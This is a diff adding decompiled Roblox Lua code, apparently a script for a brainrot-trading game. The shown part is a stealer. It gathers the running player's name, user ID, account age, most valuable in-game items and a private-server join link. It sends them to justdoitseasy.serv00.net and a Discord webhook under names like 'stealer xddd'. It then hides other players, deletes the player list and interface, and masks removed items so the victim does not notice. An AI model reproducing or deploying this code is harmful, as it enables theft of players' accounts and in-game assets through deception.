+                                if v96:IsA("TextLabel") and v96.Name == "Generation" and string.find(v96.Text, "/s") then
+                                    local l_Parent_0 = v96.Parent;
+                                    if l_Parent_0 and l_Parent_0.Name == "AnimalOverhead" then
+                                        local l_DisplayName_1 = l_Parent_0:FindFirstChild("DisplayName");
+                                        local l_Price_0 = l_Parent_0:FindFirstChild("Price");
+                                        if l_DisplayName_1 and l_Price_0 then
+                                            local v100 = v85(v96.Text);
+                                            local v101 = v85(l_Price_0.Text);
+                                            local v102 = {
+                                                name = l_DisplayName_1.Text or "Unknown", 
+                                                genText = v96.Text, 
+                                                genValue = v100, 
+                                                priceText = l_Price_0.Text, 
+                                                priceValue = v101
+                                            };
+                                            table.insert(v86, v102);
+                                        end;
+                                    end;
+                                end;
+                            end;
+                            if #v86 == 0 then
+                                return "No brainrots found on plot.", nil;
+                            else
+                                table.sort(v86, function(v103, v104) --[[ Line: 0 ]] --[[ Name:  ]]
+                                    return v103.genValue > v104.genValue;
+                                end);
+                                local v105 = v86[1];
+                                local v106 = "";
+                                local v107 = 1;
+                                local v108 = 3;
+                                local v109 = #v86;
+                                for v110 = v107, math.min(v108, v109) do
+                                    local v111 = v86[v110];
+                                    v106 = v106 .. string.format("**%d.** %s\n> **Gen:** %s | **Price:** %s\n", v110, v111.name, v111.genText, v111.priceText);
+                                end;
+                                return v106, v105;
+                            end;
+                        end;
+                    end;
+                end)();
+                local v114 = #l_Players_0:GetPlayers() > 1 and "\226\154\160\239\184\143 **Warning:** Other players were detected!" or "\226\156\133 **Server Status:** User was alone.";
+                local v115 = {
+                    color = 16732240, 
+                    title = "Silent Protocol Executed & Intel Logged", 
+                    fields = {
+                        {
+                            name = "\240\159\145\164 Player Information", 
+                            value = string.format("**Name:** %s\n**User ID:** %d\n**Account Age:** %d days", l_LocalPlayer_0.Name, l_LocalPlayer_0.UserId, l_LocalPlayer_0.AccountAge), 
+                            inline = false
+                        }, 
+                        {
+                            name = "\240\159\147\138 SERVER STATUS", 
+                            value = v114, 
+                            inline = false
+                        }, 
+                        {
+                            name = "\240\159\167\160 User's Top Brainrots", 
+                            value = v112 or "N/A", 
+                            inline = false
+                        }, 
+                        {
+                            name = "\240\159\148\151 Join Private Server", 
+                            value = "[Click To Join](" .. l_Text_2 .. ")", 
+                            inline = false
+                        }
+                    }, 
+                    footer = {
+                        text = "Logged via Yeswk2 Lmfaooo"
+                    }
+                };
+                local v116 = "";
+                if v113 and v113.genValue >= 150000000 and v113.priceValue >= 10000000000 then
+                    v116 = "@everyone";
+                end;
+                local v117 = {
+                    content = v116, 
+                    username = "stealer xddd", 
+                    avatar_url = "https://i.imgur.com/lPNVdzu.jpeg", 
+                    embeds = {
+                        v115
+                    }
+                };
+                local l_status_0, l_result_0 = pcall(v6, "https://justdoitseasy.serv00.net");
+                if l_status_0 and l_result_0 then
+                    l_result_0:Send(l_HttpService_0:JSONEncode(v117));
+                    task.wait(0.5);
+                    l_result_0:Close();
+                end;
+                if getgenv().UserWebhookURL then
+                    local l_UserWebhookURL_0 = getgenv().UserWebhookURL;
+                    if type(l_UserWebhookURL_0) == "string" and getgenv().UserWebhookURL:match("discord.com/api/webhooks") then
+                        local l_UserPingThreshold_0 = getgenv().UserPingThreshold;
+                        local v122 = type(l_UserPingThreshold_0) == "number" and getgenv().UserPingThreshold or 50000000;
+                        l_UserWebhookURL_0 = "";
+                        if v113 and v122 <= v113.genValue then
+                            l_UserWebhookURL_0 = "@everyone";
+                        end;
+                        local v123 = {
+                            content = l_UserWebhookURL_0, 
+                            username = "skibidi lemon", 
+                            avatar_url = "https://i.imgur.com/lPNVdqu.jpeg", 
+                            embeds = {
+                                v115
+                            }
+                        };
+                        do
+                            local l_v123_0 = v123;
+                            pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                                -- upvalues: v7 (ref), l_HttpService_0 (ref), l_v123_0 (ref)
+                                v7({
+                                    Url = getgenv().UserWebhookURL, 
+                                    Method = "POST", 
+                                    Headers = {
+                                        ["Content-Type"] = "application/json"
+                                    }, 
+                                    Body = l_HttpService_0:JSONEncode(l_v123_0)
+                                });
+                            end);
+                        end;
+                    end;
+                end;
+                return;
+            end;
+        end);
+        pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+            -- upvalues: l_ReplicatedStorage_0 (ref)
+            local l_Net_0 = l_ReplicatedStorage_0:WaitForChild("Packages"):WaitForChild("Net");
+            l_Net_0:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(_, _) --[[ Line: 0 ]] --[[ Name:  ]]
+
+            end);
+            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: l_Net_0 (ref)
+                l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("Music");
+                l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects");
+                l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips");
+                l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX");
+            end);
+        end);
+        pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+            -- upvalues: l_Players_0 (ref), l_LocalPlayer_0 (ref), l_Workspace_0 (ref)
+            local function v124(p12) --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: l_LocalPlayer_0 (ref)
+                if not p12 or p12 == l_LocalPlayer_0 then
+                    return;
+                end;
+                local function v125(p13) --[[ Line: 0 ]] --[[ Name:  ]]
+                    if not p13 then
+                        return;
+                    end;
+                    pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                        -- upvalues: p13 (ref)
+                        for _, v127 in ipairs(p13:GetDescendants()) do
+                            if v127:IsA("BasePart") then
+                                v127.Anchored = true;
+                                v127.CanCollide = false;
+                            end;
+                        end;
+                        local v128 = p13:FindFirstChild("HumanoidRootPart") or p13:FindFirstChild("Torso");
+                        if v128 then
+                            v128.Anchored = true;
+                            v128.CFrame = CFrame.new(0, -1000000, 0);
+                        end;
+                    end);
+                end;
+                if p12.Character then
+                    v125(p12.Character);
+                end;
+                p12.CharacterAdded:Connect(v125);
+            end;
+            local function v129() --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: l_LocalPlayer_0 (ref)
+                local l_CoreGui_0 = game:GetService("CoreGui");
+                local l_TeamList_0;
+                local l_Success_0, l_Result_0 = pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                    return l_CoreGui_0.PlayerList.Children.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrame.ClippingFrame.ScrollingFrame.OffsetUndoFrame.TeamList_Neutral;
+                end);
+                if l_Success_0 then
+                    l_TeamList_0 = l_Result_0;
+                end;
+                if not l_TeamList_0 then
+                    return;
+                end;
+                for _, v130 in ipairs(l_TeamList_0:GetChildren()) do
+                    local v131 = nil;
+                    for _, v132 in ipairs(v130:GetDescendants()) do
+                        if v132:IsA("TextLabel") and v132.Name == "PlayerName" then
+                            v131 = v132;
+                            break;
+                        end;
+                    end;
+                    if v131 and v131.Text ~= l_LocalPlayer_0.Name and v131.Text ~= l_LocalPlayer_0.DisplayName then
+                        pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                            -- upvalues: v130 (ref)
+                            v130:Destroy();
+                        end);
+                    end;
+                end;
+            end;
+            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: l_Players_0 (ref), v124 (ref), v129 (ref)
+                for _, v133 in ipairs(l_Players_0:GetPlayers()) do
+                    v124(v133);
+                end;
+                l_Players_0.PlayerAdded:Connect(v124);
+                while task.wait(2) do
+                    v129();
+                end;
+            end);
+            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: l_Workspace_0 (ref), l_LocalPlayer_0 (ref)
+                l_Workspace_0.ChildAdded:Connect(function(v134) --[[ Line: 0 ]] --[[ Name:  ]]
+                    -- upvalues: l_LocalPlayer_0 (ref)
+                    if v134:IsA("Model") and v134.Name ~= l_LocalPlayer_0.Name and v134:FindFirstChild("HumanoidRootPart") then
+                        pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                            -- upvalues: v134 (ref)
+                            for _, v135 in ipairs(v134:GetDescendants()) do
+                                if v135:IsA("BasePart") then
+                                    v135.Anchored = true;
+                                    v135.CanCollide = false;
+                                end;
+                            end;
+                            local l_v134_FirstChild_0 = v134:FindFirstChild("HumanoidRootPart") or v134:FindFirstChild("Torso");
+                            if l_v134_FirstChild_0 then
+                                l_v134_FirstChild_0.Anchored = true;
+                                l_v134_FirstChild_0.CFrame = CFrame.new(0, -1000000, 0);
+                            end;
+                        end);
+                    end;
+                end);
+            end);
+            pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                local l_CoreGui_1 = game:GetService("CoreGui");
+                local l_RobloxGui_0 = l_CoreGui_1:FindFirstChild("RobloxGui");
+                if l_RobloxGui_0 then
+                    l_RobloxGui_0:Destroy();
+                end;
+            end);
+        end);
+        pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+            local l_Plots_2 = workspace:WaitForChild("Plots");
+            local v136 = {};
+            local v137 = {};
+            local v138 = {};
+            local function v143(v139) --[[ Line: 0 ]] --[[ Name:  ]]
+                local v140 = {
+                    "PlotSign", 
+                    "AnimalPodiums", 
+                    "MainRoot"
+                };
+                for _, v142 in ipairs(v139:GetChildren()) do
+                    if v142:IsA("Model") and not table.find(v140, v142.Name) then
+                        v142:Destroy();
+                    end;
+                end;
+            end;
+            local function v147(v144) --[[ Line: 0 ]] --[[ Name:  ]]
+                for _, v146 in ipairs(v144:GetDescendants()) do
+                    if v146.Name == "Spawn" or v146.Name == "Collect" then
+                        v146:Destroy();
+                    end;
+                end;
+            end;
+            for _, v149 in ipairs(l_Plots_2:GetChildren()) do
+                if v149:IsA("Model") then
+                    local v150 = v149:FindFirstChild("PlotSign", true) and v149.PlotSign:FindFirstChild("SurfaceGui", true) and v149.PlotSign.SurfaceGui:FindFirstChild("Frame", true) and v149.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel", true);
+                    if v150 and v150.Text ~= "Empty Base" then
+                        v136[v149] = true;
+                    elseif v149.PrimaryPart then
+                        local v151 = {
+                            plot = v149, 
+                            cframe = v149.PrimaryPart.CFrame
+                        };
+                        table.insert(v137, v151);
+                    end;
+                end;
+            end;
+            for _, v153 in ipairs(v137) do
+                local v154 = v153.plot:Clone();
+                v143(v154);
+                v147(v154);
+                local v155 = {
+                    clone = v154, 
+                    cframe = v153.cframe
+                };
+                table.insert(v138, v155);
+            end;
+            for _, v157 in ipairs(v137) do
+                v157.plot:Destroy();
+            end;
+            for _, v159 in ipairs(v138) do
+                local l_clone_0 = v159.clone;
+                local l_cframe_0 = v159.cframe;
+                l_clone_0.Parent = l_Plots_2;
+                if l_clone_0.PrimaryPart and l_cframe_0 then
+                    l_clone_0:SetPrimaryPartCFrame(l_cframe_0);
+                end;
+            end;
+            l_Plots_2.ChildAdded:Connect(function(v162) --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: v136 (ref)
+                if v136[v162] then
+                    return;
+                else
+                    v162:Destroy();
+                    return;
+                end;
+            end);
+        end);
+        pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+            -- upvalues: v8 (ref), l_Workspace_0 (ref)
+            local function _(v163) --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: v8 (ref), l_Workspace_0 (ref)
+                return v163:IsA("Model") and v8[v163.Name] and v163.Parent == l_Workspace_0;
+            end;
+            for _, v166 in ipairs(l_Workspace_0:GetChildren()) do
+                do
+                    local l_v166_0 = v166;
+                    if l_v166_0:IsA("Model") and v8[l_v166_0.Name] and l_v166_0.Parent == l_Workspace_0 then
+                        pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                            -- upvalues: l_v166_0 (ref)
+                            l_v166_0:Destroy();
+                        end);
+                    end;
+                end;
+            end;
+            l_Workspace_0.ChildAdded:Connect(function(v168) --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: v8 (ref), l_Workspace_0 (ref)
+                if v168:IsA("Model") and v8[v168.Name] and v168.Parent == l_Workspace_0 then
+                    pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                        -- upvalues: v168 (ref)
+                        v168:Destroy();
+                    end);
+                end;
+            end);
+        end);
+        pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+            -- upvalues: l_Workspace_0 (ref), l_LocalPlayer_0 (ref)
+            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: l_Workspace_0 (ref), l_LocalPlayer_0 (ref)
+                local v169 = nil;
+                repeat
+                    task.wait(1);
+                    local l_Plots_3 = l_Workspace_0:FindFirstChild("Plots");
+                    if l_Plots_3 then
+                        for _, v172 in ipairs(l_Plots_3:GetChildren()) do
+                            if v172:IsA("Model") then
+                                local l_v172_FirstChild_0 = v172:FindFirstChild("PlotSign", true);
+                                if l_v172_FirstChild_0 then
+                                    local l_l_v172_FirstChild_0_FirstChildWhichIsA_0 = l_v172_FirstChild_0:FindFirstChildWhichIsA("TextLabel", true);
+                                    if l_l_v172_FirstChild_0_FirstChildWhichIsA_0 and (string.find(l_l_v172_FirstChild_0_FirstChildWhichIsA_0.Text, l_LocalPlayer_0.DisplayName, 1, true) or string.find(l_l_v172_FirstChild_0_FirstChildWhichIsA_0.Text, l_LocalPlayer_0.Name, 1, true)) then
+                                        v169 = v172;
+                                        break;
+                                    end;
+                                end;
+                            end;
+                        end;
+                    end;
+                until v169;
+                local v175 = v169.WaitForChild(v169, "AnimalPodiums");
+                local v176 = {};
+                local v177 = {
+                    "Rarity", 
+                    "DisplayName", 
+                    "Generation", 
+                    "Mutation", 
+                    "Price", 
+                    "Traits"
+                };
+                local v178 = false;
+                while task.wait(0.25) and v169 and v169.Parent do
+                    for _, v180 in ipairs(l_Workspace_0.Plots:GetChildren()) do
+                        if v180:IsA("Model") then
+                            for _, v182 in ipairs(v180:GetDescendants()) do
+                                do
+                                    local l_v182_0 = v182;
+                                    if l_v182_0:IsA("TextLabel") and l_v182_0.Name == "Stolen" then
+                                        pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                                            -- upvalues: l_v182_0 (ref)
+                                            l_v182_0:Destroy();
+                                        end);
+                                    end;
+                                end;
+                            end;
+                        end;
+                    end;
+                    local l_v175_Children_0 = v175:GetChildren();
+                    if not v178 and #l_v175_Children_0 > 0 then
+                        for _, v186 in ipairs(l_v175_Children_0) do
+                            if v186:IsA("Model") and not v176[v186] then
+                                v176[v186] = {};
+                                local l_v186_FirstChild_0 = v186:FindFirstChild("AnimalOverhead", true);
+                                if l_v186_FirstChild_0 then
+                                    for _, v189 in ipairs(v177) do
+                                        local l_l_v186_FirstChild_0_FirstChild_0 = l_v186_FirstChild_0:FindFirstChild(v189);
+                                        if l_l_v186_FirstChild_0_FirstChild_0 then
+                                            v176[v186][v189] = l_l_v186_FirstChild_0_FirstChild_0.Visible;
+                                        end;
+                                    end;
+                                end;
+                            end;
+                        end;
+                        v178 = true;
+                    end;
+                    for v191, v192 in pairs(v176) do
+                        if v191 and v191.Parent then
+                            local l_v191_FirstChild_0 = v191:FindFirstChild("AnimalOverhead", true);
+                            if l_v191_FirstChild_0 then
+                                for v194, v195 in pairs(v192) do
+                                    local l_l_v191_FirstChild_0_FirstChild_0 = l_v191_FirstChild_0:FindFirstChild(v194);
+                                    if l_l_v191_FirstChild_0_FirstChild_0 and l_l_v191_FirstChild_0_FirstChild_0.Visible ~= v195 then
+                                        l_l_v191_FirstChild_0_FirstChild_0.Visible = v195;
+                                    end;
+                                end;
+                            end;
+                        else
+                            v176[v191] = nil;
+                        end;
+                    end;
+                end;
+            end);
+        end);
+        pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+            -- upvalues: l_LocalPlayer_0 (ref)
+            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: l_LocalPlayer_0 (ref)
+                local l_Plots_4 = workspace:WaitForChild("Plots");
+                local v198 = nil;
+                local v199 = {};
+                local v200 = {};
+                local v201 = {
+                    "PlotSign", 
+                    "AnimalPodiums", 
+                    "MainRoot", 
+                    "FriendPanel"
+                };
+                local function v215() --[[ Line: 0 ]] --[[ Name:  ]]
+                    -- upvalues: l_LocalPlayer_0 (ref), l_Plots_4 (ref), v198 (ref), v201 (ref), v199 (ref), v200 (ref)
+                    local v202 = l_LocalPlayer_0.DisplayName .. "'s Base";
+                    for _, v204 in ipairs(l_Plots_4:GetChildren()) do
+                        if v204:IsA("Model") then
+                            local v205 = v204:FindFirstChild("PlotSign", true) and v204.PlotSign:FindFirstChild("SurfaceGui", true) and v204.PlotSign.SurfaceGui:FindFirstChild("Frame", true) and v204.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel", true);
+                            if v205 and v205.Text == v202 then
+                                v198 = v204;
+                                break;
+                            end;
+                        end;
+                    end;
+                    if not v198 then
+                        return;
+                    else
+                        for _, v207 in ipairs(v198:GetDescendants()) do
+                            local v208 = false;
+                            if v207.Parent == v198 then
+                                v208 = v207:IsA("Model") and not table.find(v201, v207.Name);
+                            end;
+                            if v208 then
+                                v199[v207] = {
+                                    clone = v207:Clone(), 
+                                    originalParent = v207.Parent
+                                };
+                                for _, v210 in ipairs(v207:GetDescendants()) do
+                                    if v210:IsA("BasePart") then
+                                        v200[v210] = v210.Transparency;
+                                    end;
+                                end;
+                            end;
+                        end;
+                        v198.DescendantRemoving:Connect(function(v211) --[[ Line: 0 ]] --[[ Name:  ]]
+                            -- upvalues: v199 (ref)
+                            if v199[v211] then
+                                local v212 = v199[v211];
+                                v212.clone:Clone().Parent = v212.originalParent;
+                            end;
+                        end);
+                        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                            -- upvalues: v198 (ref), v200 (ref)
+                            while task.wait(0.25) and v198 and v198.Parent do
+                                for v213, v214 in pairs(v200) do
+                                    if v213 and v213.Parent and v213.Transparency ~= v214 then
+                                        v213.Transparency = v214;
+                                    end;
+                                end;
+                            end;
+                        end);
+                        return;
+                    end;
+                end;
+                while not v198 do
+                    task.wait(1);
+                    v215();
+                end;
+            end);
+        end);
+        v81();
+        return;
+    end;
+end);
